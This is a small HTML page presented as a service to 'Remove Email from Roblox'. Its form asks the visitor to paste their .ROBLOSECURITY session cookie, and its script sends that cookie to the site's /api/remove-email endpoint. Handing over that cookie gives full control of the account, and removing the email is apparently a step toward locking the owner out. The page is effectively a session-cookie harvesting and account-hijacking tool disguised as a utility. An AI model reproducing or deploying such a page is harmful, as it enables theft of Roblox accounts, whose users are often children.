<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>Remove Email from Roblox</title>
  <style>
    body {
      font-family: Arial, sans-serif;
      background: #f5f5f5;
      display: flex;
      flex-direction: column;
      align-items: center;
      margin-top: 80px;
    }
    form {
      background: white;
      padding: 30px;
      border-radius: 10px;
      box-shadow: 0 0 10px rgba(0,0,0,0.1);
    }
    input {
      width: 300px;
      padding: 10px;
      margin-bottom: 10px;
    }
    button {
      padding: 10px 20px;
      background: #22c55e;
      color: white;
      border: none;
      border-radius: 5px;
      cursor: pointer;
    }
    #response {
      margin-top: 20px;
      font-weight: bold;
    }
  </style>
</head>
<body>
  <form id="emailForm">
    <h2>Remove Email from Roblox</h2>
    <input type="text" name="cookie" placeholder=".ROBLOSECURITY Cookie" required /><br />
    <button type="submit">Remove Email</button>
    <div id="response"></div>
  </form>

  <script>
    const form = document.getElementById('emailForm');
    const responseBox = document.getElementById('response');

    form.addEventListener('submit', async (e) => {
      e.preventDefault();
      responseBox.textContent = '‚è≥ Sending request...';

      const cookie = form.cookie.value;
      const res = await fetch('/api/remove-email', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ cookie })
      });

      const data = await res.json();
      responseBox.textContent = data.message || 'Something went wrong.';
    });
  </script>
</body>
</html>
